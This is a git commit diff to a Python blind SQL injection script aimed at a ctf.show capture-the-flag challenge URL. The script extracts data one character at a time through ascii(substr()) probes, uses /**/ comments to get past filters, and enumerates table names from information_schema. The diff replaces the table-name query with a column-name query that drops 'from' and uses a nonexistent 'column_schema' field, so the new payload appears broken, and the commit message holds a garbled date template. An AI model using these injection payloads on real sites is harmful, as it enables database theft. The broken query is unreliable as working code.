0860a83c0abf77a638b8debeecd86abeb4534e74
whb54012 <1226844928@qq.com>
2026-07-21 12:27:50 +0000

    自动提交：更新 ${2026/7/21 20:27ilenPM27e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -5,10 +5,10 @@ word=""
 num=0
 url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
 for num1 in range(1,8):
-    for num2 in range (47,123):
+    for num2 in range (20,180):
         # data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
-        data = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
-        # data = "ascii(substr((select/**/group_concat(table_name)/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
+        # data = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
+        data = "ascii(substr((select/**/group_concat(column_name)/**/information_schema.columns/**/where/**/column_schema='flag')/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         result = requests.get(url + data,verify=False)
         if "If" in result.text:
             word+=chr(num2)
